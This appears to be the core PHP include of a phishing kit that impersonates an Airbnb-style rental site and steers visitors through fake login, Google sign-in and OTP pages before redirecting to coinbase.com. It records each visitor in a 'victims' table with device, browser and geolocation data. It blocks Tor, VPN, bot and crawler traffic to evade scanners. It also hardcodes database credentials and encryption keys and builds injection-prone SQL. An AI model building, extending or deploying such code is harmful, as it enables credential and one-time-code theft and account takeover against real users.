<?php

error_reporting(0);

if(!isset( $_SESSION )){
    session_start();
}

header("X-XSS-Protection: 1; mode=block");
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("Strict-Transport-Security: max-age=31536000; includeSubDomains; preload");
header("Referrer-Policy: no-referrer");


$database = "localhost";
$user       = "bnbclone_bnb";
$pass       = "FUn;aQ?kK1T7";
$database   = "bnbclone_bnb";

$con = mysqli_connect($host, $user, $pass, $database);
mysqli_query($con, "SET NAMES utf8mb4") or die(mysqli_error($con));

$secretKey = 'QKZ55';
$encryptionKey = 'QKCSRF55';

$cookieData = array(
    'csrf_token' => csrf(),
);

$expirationTime = time() + 3600;

$cookieName = 'csrf_token';

if(!isset($_COOKIE['csrf_token'])) {
    setEncryptedCookie($cookieName, $cookieData, $expirationTime, $secretKey);
    redirect('./');
}

if(isTorExitPoint()){
    header("Status: 403 Forbidden", true, 403);
    header("HTTP/1.1 403 Forbidden");
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">', "\n";
    echo '<html><head>', "\n";
    echo '<title>403 Forbidden</title>', "\n";
    echo '</head><body>', "\n";
    echo '<h1>Forbidden</h1>', "\n";
    echo '<p>You don\'t have permission to access / on this server.</p>', "\n";
    echo '</body></html>', "\n";
    exit;
}

if(isVPNProxy()){
    header("Status: 403 Forbidden", true, 403);
    header("HTTP/1.1 403 Forbidden");
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">', "\n";
    echo '<html><head>', "\n";
    echo '<title>403 Forbidden</title>', "\n";
    echo '</head><body>', "\n";
    echo '<h1>Forbidden</h1>', "\n";
    echo '<p>You don\'t have permission to access / on this server.</p>', "\n";
    echo '</body></html>', "\n";
    exit;
}

if(isBot()){
    header("Status: 403 Forbidden", true, 403);
    header("HTTP/1.1 403 Forbidden");
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">', "\n";
    echo '<html><head>', "\n";
    echo '<title>403 Forbidden</title>', "\n";
    echo '</head><body>', "\n";
    echo '<h1>Forbidden</h1>', "\n";
    echo '<p>You don\'t have permission to access / on this server.</p>', "\n";
    echo '</body></html>', "\n";
    exit;
}

function error( $message, $code = 400){
    $data = array(
        'status' => 'error',
        'message' => $message
    );
    header("Status: $code Bad Request", true, $code);
    json($data);
}

function success( $message ){
    $data = array(
        'status' => 'success',
        'message' => $message
    );
    header("Status: 200 OK", true, 200);
    json($data);
}

function json( $data ){
    header('Content-Type: application/json');
    echo json_encode($data);
    exit;
}

function redirect($url){
    header('Location: '.$url);
    header('Connection: close');
    header('Content-Length: '.ob_get_length());
    ob_end_flush();
    ob_flush();
    flush();
    exit;
}

function session(){
    if(isset($_SESSION['admin_id'])){
        $admin_id = $_SESSION['admin_id'];
        $query = fetch_data("SELECT * FROM `admin` WHERE `id` = '$admin_id'");
        if($query){
            return true;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

function setEncryptedCookie($cookieName, $cookieData, $expirationTime, $secretKey) {
    $encryptedData = openssl_encrypt(json_encode($cookieData), 'AES-256-CBC', $secretKey, 0, substr(md5($secretKey), 0, 16));
    setcookie($cookieName, $encryptedData, $expirationTime, '/', '', true, true);
}

function getDecryptedCookie($cookieName, $secretKey) {
    if (isset($_COOKIE[$cookieName])) {
        $encryptedData = $_COOKIE[$cookieName];
        $decryptedData = openssl_decrypt($encryptedData, 'AES-256-CBC', $secretKey, 0, substr(md5($secretKey), 0, 16));
        return json_decode($decryptedData, true);
    }
    
    return null;
}

function csrf(){
    if(!isset($_SESSION['encrypted_csrf_token'])){
        $encryptedCSRFToken = generateEncryptedCSRFToken('QKCSRF55');
        $_SESSION['encrypted_csrf_token'] = $encryptedCSRFToken;
    }else{
        $encryptedCSRFToken = $_SESSION['encrypted_csrf_token'];
    }
    return $encryptedCSRFToken;
}

function generateEncryptedCSRFToken($key)
{
    $csrfToken = bin2hex(random_bytes(32));
    $encryptedToken = openssl_encrypt($csrfToken, 'AES-256-CBC', $key, 0, 'your-iv');
    return $encryptedToken;
}

function validateAndDecryptCSRFToken($token, $key)
{
    $decryptedToken = openssl_decrypt($token, 'AES-256-CBC', $key, 0, 'your-iv');
    return $decryptedToken;
}

function site( $type ){
    global $con;
    $result = mysqli_query($con, "SELECT * FROM `settings`");
    $data = mysqli_fetch_array($result);
    return $data[$type];
}

function admin( $type ){
    global $con;
    $result = mysqli_query($con, "SELECT * FROM `admin`");
    $data = mysqli_fetch_array($result);
    return $data[$type];
}

function fetch_data( $query ){
    global $con;
    $result = mysqli_query($con, $query) or die(mysqli_error($con));
    $row = mysqli_fetch_array($result);
    return $row;
}

function fetch( $query ){
    global $con;
    $result = mysqli_query($con, $query) or die(mysqli_error($con));
    $data = array();
    while($row = mysqli_fetch_array($result)){
        $data[] = $row;
    }
    return $data;
}

function insert_data($query, $params = array()) {
    global $con;
    
    $stmt = mysqli_prepare($con, $query);
    if (!$stmt) {
        die(mysqli_error($con));
    }

    if (!empty($params)) {
        $types = '';
        $values = array();

        foreach ($params as $param) {
            $types .= get_param_type($param);
            $values[] = $param;
        }

        mysqli_stmt_bind_param($stmt, $types, ...$values);
    }

    mysqli_stmt_execute($stmt);
    $result = mysqli_stmt_affected_rows($stmt);
    mysqli_stmt_close($stmt);

    return $result;
}

function update_data( $query ){
    global $con;
    $result = mysqli_query($con, $query) or die(mysqli_error($con));
    return $result;
}

function delete_data( $query ){
    global $con;
    $result = mysqli_query($con, $query) or die(mysqli_error($con));
    return $result;
}

function insert_sql($values) {
    $columns = implode('`, `', array_keys($values));
    $placeholders = implode(', ', array_fill(0, count($values), '?'));
    return "(`$columns`) VALUES ($placeholders)";
}

function update_sql($values) {
    $setStatements = array();
    foreach ($values as $column => $value) {
        $setStatements[] = "`$column` = '$value'";
    }
    return implode(', ', $setStatements);
}

function get_param_type($value) {
    if (is_int($value)) {
        return 'i';
    } elseif (is_float($value)) {
        return 'd';
    } elseif (is_string($value)) {
        return 's';
    } else {
        return 'b';
    }
}

function countable($value){
    if($value){
        return count($value);
    }else{
        return 0;
    }
}

function set_session($type, $value){

    $update = update_data("UPDATE `victims` SET `$type` = '$value' WHERE `ip` = '".ip()."'");

    if($update){
        return true;
    }else{
        return false;
    }
}

function insert_victim(){

    $ip = ip();
    $useragent    = useragent();    
    $id           = uniqid();
    $session_id   = session_id();
    $csrf_token   = csrf();
    $current_page = 'signin';
    $status       = 'online';
    $device       = device();
    $browser      = browser();
    $os           = os();
    $created_at   = date('Y-m-d H:i:s');

    $insert = insert_data("INSERT INTO `victims` (`id`, `session_id`, `csrf_token`, `current_page`, `status`, `ip`, `device`, `browser`, `os`, `created_at`) VALUES ('$id', '$session_id', '$csrf_token', '$current_page', '$status', '$ip', '$device', '$browser', '$os', '$created_at')");
    
    if($insert){
        return true;
    }else{
        return false;
    }
}

$check = fetch_data("SELECT * FROM `victims` WHERE `ip` = '".ip()."'");

if(empty($check)){
    insert_victim();
}

function victim($type){

    $check = fetch_data("SELECT * FROM `victims` WHERE `ip` = '".ip()."'");

    if($check){
        return $check[$type];
    }else{
        return false;
    }
}

function victim_data($type){

    $check = fetch_data("SELECT * FROM `victims` WHERE `ip` = '".ip()."'");

    if(!$check) return false;
    
    $fetch = fetch_data("SELECT * FROM `victims_data` WHERE `victim_id` = '".$check['id']."'");

    if($fetch){
        return $fetch[$type];
    }else{
        return false;
    }
}

function check_page() {
    
    $current_page = victim('current_page');
    $page = basename($_SERVER['PHP_SELF'], '.php');

    $pages_with_query_params = array("pre_google_signin", "entry");
    
    if (in_array($current_page, $pages_with_query_params)) {
        $redirect_url = $current_page . '?token=501892851093485108241-421481924&session=true.login&provider=google';
    } else {
        $redirect_url = $current_page;
    }
    
    if ($current_page != $page && !isset($_GET['error'])) {
        redirect($redirect_url);
    }
}

function update_victim($values = array()) {

    $fetch = fetch_data("SELECT * FROM `victims` WHERE `ip` = '" . ip() . "'");
    if (!$fetch) return false;

    $id = $fetch['id'];

    $fetch = fetch_data("SELECT * FROM `victims_data` WHERE `victim_id` = '$id'");

    if (!$fetch) {
        $uid = uniqid();
        $victim_id = $id;
        $created_at = date('Y-m-d H:i:s');

        $insert_values = array(
            'id' => $uid,
            'victim_id' => $victim_id,
            'created_at' => $created_at
        );

        $insert_values = array_merge($insert_values, $values);

        $insert = insert_data("INSERT INTO `victims_data` " . insert_sql($insert_values), $insert_values);
    } else {

        $update = update_data("UPDATE `victims_data` SET " . update_sql($values) . " WHERE `victim_id` = '$id'");
    }

    return $update;
}

function ip(){
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        if(isset($_SERVER['REMOTE_ADDR'])){
            $ip = $_SERVER['REMOTE_ADDR'];
        }else{
            $ip = '';
        }
    }
    return $ip;
}

function useragent(){
    return $_SERVER['HTTP_USER_AGENT'];
}

function isTorExitPoint() {
    $reverseIp = implode('.', array_reverse(explode('.', $_SERVER['REMOTE_ADDR'])));
    $reverseServerIp = implode('.', array_reverse(explode('.', $_SERVER['SERVER_ADDR'])));
    $query = $reverseIp . '.' . $_SERVER['SERVER_PORT'] . '.' . $reverseServerIp . '.ip-port.exitlist.torproject.org';
    
    $result = gethostbyname($query);
    
    return $result !== $query;
}

function isVPNProxy() {
    
    $headers = apache_request_headers();
    $suspiciousHeaders = [
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_FORWARDED_FOR',
        'HTTP_VIA',
        'HTTP_PROXY_CONNECTION',
        'HTTP_PROXY',
        'HTTP_CLIENT_IP',
    ];

    foreach ($suspiciousHeaders as $header) {
        if (isset($headers[$header])) {
            return true; 
        }
    }

    return false; 
}

function isMobile(){
    if (useragent()) {
        $userAgents = array(
            'iPhone',          // iPhone
            'iPod',            // iPod touch
            'Android',         // 1.5+ Android
            'dream',           // Pre 1.5 Android
            'CUPCAKE',         // 1.5+ Android
            'blackberry9500',  // Storm
            'blackberry9530',  // Storm
            'blackberry9520',  // Storm v2
            'blackberry9550',  // Storm v2
            'blackberry9800',  // Torch
            'webOS',           // Palm Pre Experimental
            'incognito',       // Other iPhone browser
            'webmate'          // Other iPhone browser
        );
        foreach ($userAgents as $userAgent) {
            if (strpos(useragent(), $userAgent) !== false) {
                return true;
            }
        }
    }
    return false;
}

function isBot(){
    if (useragent()) {
        $userAgents = array(
            'bot',          // bot
            'spider',            // spider
            'crawl',         // crawl
            'slurp',           // slurp
            'facebookexternalhit',         // facebookexternalhit
            'facebot',           // facebot
            'ia_archiver',  // ia_archiver
            'googlebot',  // googlebot
            'bingbot',  // bingbot
            'msnbot',  // msnbot
            'yandexbot',  // yandexbot
            'baiduspider',  // baiduspider
            'duckduckbot',  // duckduckbot
            'teoma',  // teoma
            'slurp',  // slurp
            'scooter',  // scooter
            'ia_archiver',  // ia_archiver
            'mediapartners-google',  // mediapartners-google
            'webcrawler',  // webcrawler
            'baiduspider',  // baiduspider
            'curl',  // curl
            'wget',  // wget
            'ec2bot',  // ec2bot
            'appengine-google',  // appengine-google
            'feedfetcher-google',  // feedfetcher-google
            'yahoo-mmcrawler',  // yahoo-mmcrawler
            'fast-webcrawler',  // fast-webcrawler
            'googlebot-image',  // googlebot-image
            'mediapartners-google',  // mediapartners-google
            'yahoo-blogs',  // yahoo-blogs
            'yahoo-news',  // yahoo-news
            'yahoo-verticalcrawler',  // yahoo-verticalcrawler
            'yahoo-verticalcrawler',  // yahoo-verticalcrawler
            'yahoo! slurp',  // yahoo! slurp
            'yahoo! slurp china',  // yahoo! slurp china
            'yahoo! slurp taiwan',  // yahoo! slurp taiwan
            'yahooseeker',  // yahooseeker
            'yahoobot',  // yahoobot
            'yandex',  // yandex        
            'yandexbot',  // yandexbot    
            'yandeximages',  // yandeximages
            'yandexvideo',  // yandexvideo
            'yandexmedia',  // yandexmedia
            'yandexblogs',  // yandexblogs
            'yandexaddurl',  // yandexaddurl
            'yandexfavicons',  // yandexfavicons
            'yandexdirect',  // yandexdirect
            'yandexmetrika',  // yandexmetrika
            'yandexcatalog',  // yandexcatalog
            'yandexnews',  // yandexnews
            'AhrefsBot',
            'DotBot',
            'Exabot',
            'MJ12bot',
            'SEMrushBot',
            'SemrushBot-SA',
            'Rogerbot',
            'Sogou web spider',
            'Sogou inst spider',
            'Sogou Pic Spider',
            'Sogou-Test-Spider',
            'Sosospider',
            'BLEXBot',
            'CCBot',
            'CCBot/2.0',
            'SEOkicks-Robot'
        );
        foreach ($userAgents as $userAgent) {
            if (strpos(useragent(), $userAgent) !== false) {
                return true;
            }
        }
    }
    return false;
}

function device()
{
    $userAgent = useragent();
    $device = 'Unknown';
    $devices = array(
        'iPhone' => 'iPhone',
        'iPod' => 'iPod',
        'iPad' => 'iPad',
        'BlackBerry' => 'BlackBerry',
        'HTC' => 'HTC',
        'Nokia' => 'Nokia',
        'Ericsson' => 'Ericsson',
        'Samsung' => 'Samsung',
        'LG' => 'LG',
        'SonyEricsson' => 'SonyEricsson',
        'MOT' => 'Motorola',
        'Symbian' => 'Symbian',
        'SymbOS' => 'Symbian',
        'Fenix' => 'Symbian',
        'S60' => 'Symbian',
        'Series60' => 'Symbian',
        'Windows CE' => 'Windows CE',
        'WindowsCE' => 'Windows CE',
        'Palm' => 'Palm',
        'Sony' => 'Sony',
        'PocketPC' => 'PocketPC',
        'PalmOS' => 'PalmOS',
        'Opera Mini' => 'Opera Mini',
        'Opera Mobi' => 'Opera Mobi',
        'Android' => 'Android',
        'hiptop' => 'Danger Hiptop',
        'Nexus' => 'Nexus',
        'Benq' => 'Benq',
        'Java' => 'Java Phone',
        'Windows Phone' => 'Windows Phone',
        'Obigo' => 'Obigo',
        'Netfront' => 'Netfront Browser',
        'Teleca' => 'Teleca Browser',
        'Playstation Portable' => 'Playstation Portable',
        'Playstation' => 'Playstation',
        'Nintendo Wii' => 'Nintendo Wii',
        'Nintendo DS' => 'Nintendo DS',
        'Nitro' => 'Nintendo DS',
        'Nintendo' => 'Nintendo',
        'Wii' => 'Nintendo Wii',
        'Xbox' => 'Xbox',
        'Archos' => 'Archos',
        'PSP' => 'Playstation Portable',
        'Danger Hiptop' => 'Danger Hiptop',
        'Danger' => 'Danger Hiptop',
        'Kindle' => 'Kindle',
        'Siemens' => 'Siemens',
        'HP iPAQ' => 'HP iPAQ',
        'Zune' => 'Zune',
        'ZTE' => 'ZTE',
        'Imate' => 'Imate',
        'Motorola' => 'Motorola',
        'Generic' => 'Generic Phone',
        'Generic Smartphone' => 'Generic Smartphone',
        'Generic Feature Phone' => 'Generic Feature Phone',
        'Generic Tablet' => 'Generic Tablet',
        'Generic Smartwatch' => 'Generic Smartwatch',
        'Generic Desktop' => 'Generic Desktop',
        'Generic TV' => 'Generic TV',
        'Generic DVR' => 'Generic DVR',
        'Generic Game Console' => 'Generic Game Console',
        'Generic Voice Device' => 'Generic Voice Device',
        'Generic Car' => 'Generic Car',
        'Generic Portable Media Player' => 'Generic Portable Media Player',
    );

    foreach ($devices as $deviceName => $deviceRegex) {
        if (preg_match("/" . $deviceRegex . "/i", $userAgent)) {
            if ($deviceName === 'iPhone') {
                if (preg_match("/iPhone\s([\w\.]+)/i", $userAgent, $matches)) {
                    $device = 'iPhone ' . $matches[1];
                } else {
                    $device = 'iPhone';
                }
            } elseif ($deviceName === 'Samsung') {
                if (preg_match("/Samsung[\s-]+([\w\.]+)/i", $userAgent, $matches)) {
                    $device = 'Samsung ' . $matches[1];
                } else {
                    $device = 'Samsung';
                }
            } else {
                $device = $deviceName;
            }
            break;
        }
    }

    return $device;
}


function os(){
    $userAgent = useragent();
    $os = 'Unknown';
    $oses = array(
        'Windows 10' => '(Windows 10.0|Windows NT 10.0)',
        'Windows 8.1' => '(Windows 8.1|Windows NT 6.3)',
        'Windows 8' => '(Windows 8|Windows NT 6.2)',
        'Windows 7' => '(Windows 7|Windows NT 6.1)',
        'Windows Vista' => 'Windows NT 6.0',
        'Windows Server 2003' => 'Windows NT 5.2',
        'Windows XP' => '(Windows NT 5.1|Windows XP)',
        'Windows 2000' => '(Windows NT 5.0|Windows 2000)',
        'Windows ME' => '(Win 9x 4.90|Windows ME)',
        'Windows 98' => '(Windows 98|Win98)',
        'Windows 95' => '(Windows 95|Win95|Windows_95)',
        'Windows NT 4.0' => '(Windows NT 4.0|WinNT4.0|WinNT|Windows NT)',
        'Windows CE' => 'Windows CE',
        'Windows 3.11' => 'Win16',
        'Android' => 'Android',
        'Open BSD' => 'OpenBSD',
        'Sun OS' => 'SunOS',
        'Linux' => '(Linux|X11)',
        'iOS' => '(iPhone|iPad|iPod)',
        'Mac OS X' => 'Mac OS X',
        'Mac OS' => '(MacPPC|MacIntel|Mac_PowerPC|Macintosh)',
        'QNX' => 'QNX',
        'UNIX' => 'UNIX',
        'BeOS' => 'BeOS',
        'OS/2' => 'OS/2',
        'Search Bot'=>'(nuhk|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask Jeeves/Teoma|ia_archiver)'
    );
    foreach ($oses as $osName => $osRegex) {
        if (preg_match("/" . $osRegex . "/i", $userAgent)) {
            $os = $osName;
            break;
        }
    }
    return $os;
}

function browser(){
    $userAgent = useragent();
    $browser = 'Unknown';
    $browsers = array(
        'Internet Explorer' => '(Internet Explorer|MSIE|Trident/7)',
        'Edge' => '(Edge|Edg)',
        'Chrome' => '(Chrome|CriOS)',
        'Dolphin' => 'Dolphin',
        'Opera' => '(Opera|OPR)',
        'Firefox' => '(Firefox|FxiOS)',
        'UC Browser' => 'UCBrowser',
        'Safari' => 'Safari',
        'Konqueror' => 'Konqueror',
        'Netscape' => 'Netscape',
        'Mozilla' => '(Mozilla|Netscape)',
    );
    foreach ($browsers as $browserName => $browserRegex) {
        if (preg_match("/" . $browserRegex . "/i", $userAgent)) {
            $browser = $browserName;
            break;
        }
    }
    return $browser;
}

function user_remote($attribute)
{
    $ip      = ip();
    $api_url = 'http://ip-api.com/json/'.$ip;
    $data    = json_decode(file_get_contents($api_url), true);
    switch ($attribute) {
        case 'isp':
            return $data['isp'];
        case 'latitude':
            return $data['lat'];
        case 'longitude':
            return $data['lon'];
        case 'city':
            return $data['city'];
        case 'region':
            return $data['regionName'];
        case 'zip':
            return $data['zip'];
        case 'country':
            return $data['country'];
        case 'timezone':
            return $data['timezone'];
        default:
            return null;
    }
}

function recaptcha( $type, $response = null ){
    if($type == 'load'){
        echo '<script src="https://www.google.com/recaptcha/api.js"></script>';
        echo '<center><div class="g-recaptcha" data-sitekey="'.site('recaptcha_site').'" data-theme="dark" data-callback="onCaptchaSuccess"></div></center>';
    }elseif($type == 'verify'){
        $secret = site('recaptcha_secret');
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.google.com/recaptcha/api/siteverify");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array('secret' => $secret, 'response' => $response)));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $server_output = curl_exec($ch);
        curl_close ($ch);
        $server_output = json_decode($server_output);
        if($server_output->success == true){
            return true;
        }else{
            return false;
        }
    }
}

function status($status){
    switch ($status) {
        case 'online':
            return '<span class="badge bg-success">Online</span>';
        case 'offline':
            return '<span class="badge bg-danger">Offline</span>';
        default:
            return '<span class="badge bg-warning">Unknown</span>';
    }
}

function convertDateRange($dateRange) {
    $dates = explode(' – ', $dateRange);
    $startDate = DateTime::createFromFormat('n/j/Y', trim($dates[0]));
    $endDate = DateTime::createFromFormat('n/j/Y', trim($dates[1]));
    if ($startDate && $endDate) {
        $startMonth = $startDate->format('M');
        $startDay = $startDate->format('j');
        $endDay = $endDate->format('j');
        return "{$startMonth} {$startDay} – {$endDay}";
    } else {
        return "Invalid date range format";
    }
}

function sanitize($input)
{
    $input = trim($input);
    $input = stripslashes($input);
    $input = htmlspecialchars($input, ENT_QUOTES | ENT_HTML5);
    $input = str_replace(array('&amp;', '&lt;', '&gt;'), array('&amp;amp;', '&amp;lt;', '&amp;gt;'), $input);
    $input = preg_replace('/(&#*\w+)[\x00-\x20]+;/u', '$1;', $input);
    $input = preg_replace('/(&#x*[0-9A-F]+);*/iu', '$1;', $input);
    $input = html_entity_decode($input, ENT_COMPAT, 'UTF-8');
    $input = preg_replace('#(<[^>]+?[\x00-\x20"\'])(?:on|xmlns)[^>]*+>#iu', '$1>', $input);
    $input = preg_replace('#([a-z]*)[\x00-\x20]*=[\x00-\x20]*([`\'"]*)[\x00-\x20]*j[\x00-\x20]*a[\x00-\x20]*v[\x00-\x20]*a[\x00-\x20]*s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:#iu', '$1=$2nojavascript...', $input);
    $input = preg_replace('#([a-z]*)[\x00-\x20]*=([\'"]*)[\x00-\x20]*v[\x00-\x20]*b[\x00-\x20]*s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:#iu', '$1=$2novbscript...', $input);
    $input = preg_replace('#([a-z]*)[\x00-\x20]*=([\'"]*)[\x00-\x20]*-moz-binding[\x00-\x20]*:#u', '$1=$2nomozbinding...', $input);
    $input = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?expression[\x00-\x20]*\([^>]*+>#i', '$1>', $input);
    $input = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?behaviour[\x00-\x20]*\([^>]*+>#i', '$1>', $input);
    $input = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:*[^>]*+>#iu', '$1>', $input);
    $input = preg_replace('#(<[^>]+?[\x00-\x20"\'])(?:on|xmlns)[^>]*+>#iu', '$1>', $input);
    $input = preg_replace('#(?:(?:<[^>]+?[\x00-\x20"\'])(?:on|xmlns)[^>]*+>)|(?:<[^>]+?[\x00-\x20"\'])(?:on|xmlns)[^>]*+>#iu', '$1>', $input);
    $input = preg_replace('#</*\w+:\w[^>]*+>#i', '', $input);
    return $input;
}

function page() {
    $currentPage = basename($_SERVER['PHP_SELF']);
    $currentPageName = pathinfo($currentPage, PATHINFO_FILENAME);
    if ($currentPageName == 'index') {
        $currentPageName = 'login';
    }
    $currentPageName = ucfirst($currentPageName);
    return $currentPageName;
}

function current_page($page, $type = null){    
    if($page == 'index'){
        $page = 'Login';
    }else if($page == 'loader'){
        $page = 'Awaiting Redirect';
    }else if($page == 'google_await'){
        $page = 'Awaiting Redirect';
    }else if($page == 'loading'){
        $page = 'Awaiting Personal Info Redirect';
    }else if($page == 'https://coinbase.com'){
        $page = 'Completed.';
    }else if($page == 'otp_auth'){
        $page = 'OTP Authenticator';
    }else if($page == 'otp_sms'){
        $page = 'OTP SMS';
    }
    
    $page = ucfirst($page);
    

    if($type == 'icon'){
        $array = array(
            'Login' => '<i class="fas fa-sign-in-alt"></i>',
            'Index' => '<i class="fas fa-sign-in-alt"></i>',
            'index' => '<i class="fas fa-sign-in-alt"></i>',
            'Awaiting Redirect' => '<i class="fas fa-spinner fa-spin"></i>',
            'Awaiting Personal Info Redirect' => '<i class="fas fa-spinner fa-spin"></i>',
            'OTP Authenticator' => '<i class="fas fa-mobile-alt"></i>',
            'OTP SMS' => '<i class="fas fa-mobile-alt"></i>',
            'Completed.' => '<i class="fas fa-check"></i>',
            'completed.' => '<i class="fas fa-check"></i>',
            'completed' => '<i class="fas fa-check"></i>'
        );

        if(isset($array[$page])){
            $page = $array[$page];
        }else{
            $page = '<i class="fas fa-info-circle"></i>';
        }
    }

    return $page;
}

function bg_status($status){
    if($status == 'Completed.' || $status == 'completed.' || $status == 'completed' || $status == 'https://coinbase.com'){
        $bg = 'bg-success';
    }elseif($status == 'Awaiting Redirect' || $status == 'Awaiting Personal Info Redirect' ||  $status == 'email'){
        $bg = 'bg-info';
    }elseif($status == 'otp_sms' || $status == 'otp_sms' || $status == 'otp_sms'){
        $bg = 'bg-warning';
    }elseif($status == 'otp_auth'){
        $bg = 'bg-secondary';
    }else{
        $bg = 'bg-warning';
    }

    return $bg;
}

function load($type){
    
    if($type == 'panel/sidebar'){
        echo
        '
    <nav class="sidebar">
      <div class="sidebar-header">
        <a href="/controller/panel/#" class="sidebar-brand">
          '.site('name').'
        </a>
        <div class="sidebar-toggler not-active">
          <span></span>
          <span></span>
          <span></span>
        </div>
      </div>
      <div class="sidebar-body">
        <ul class="nav">
          <li class="nav-item nav-category">Main</li>
          <li class="nav-item">
            <a href="/controller/panel/" class="nav-link">
              <i class="link-icon" data-feather="box"></i>
              <span class="link-title">Dashboard</span>
            </a>
          </li>
          <li class="nav-item nav-category">Host</li>
            <li class="nav-item">
            <a class="nav-link" href="/controller/panel/hosts">
                <i class="link-icon" data-feather="users"></i>
                <span class="link-title">Hosts</span>
            </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="/controller/panel/properties">
                    <i class="link-icon" data-feather="home"></i>
                    <span class="link-title">Properties</span>
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="/controller/panel/offers">
                    <i class="link-icon" data-feather="dollar-sign"></i>
                    <span class="link-title">Offers</span>
                </a>
            </li>
         <hr/>
          <li class="nav-item nav-category">Settings</li>
          <li class="nav-item">
            <a class="nav-link" href="/controller/panel/settings">
              <i class="link-icon" data-feather="settings"></i>
              <span class="link-title">Site Settings</span>
            </a>
          </li>
          <li class="nav-item">
        </ul>
      </div>
    </nav>
        ';
    }else if($type == 'panel/header'){
        echo
        '
        <nav class="navbar">
				<a href="/controller/panel/#" class="sidebar-toggler">
					<i data-feather="menu"></i>
				</a>
				<div class="navbar-content">
					<ul class="navbar-nav">
						<li class="nav-item dropdown">
							<a class="nav-link dropdown-toggle" href="/controller/panel/#" id="profileDropdown" role="button" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-settings"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>
							</a>
							<div class="dropdown-menu p-0" aria-labelledby="profileDropdown">
								<div class="d-flex flex-column align-items-center border-bottom px-5 py-3">
									<div class="mb-3">
                  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-settings"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>									</div>
									<div class="text-center">
										<p class="tx-16 fw-bolder">'.admin('username').'</p>
									</div>
								</div>
                <ul class="list-unstyled p-1">
                  <li class="dropdown-item py-2">
                    <a href="/controller/panel/" class="text-body ms-0">
                      <i class="me-2 icon-md" data-feather="home"></i>
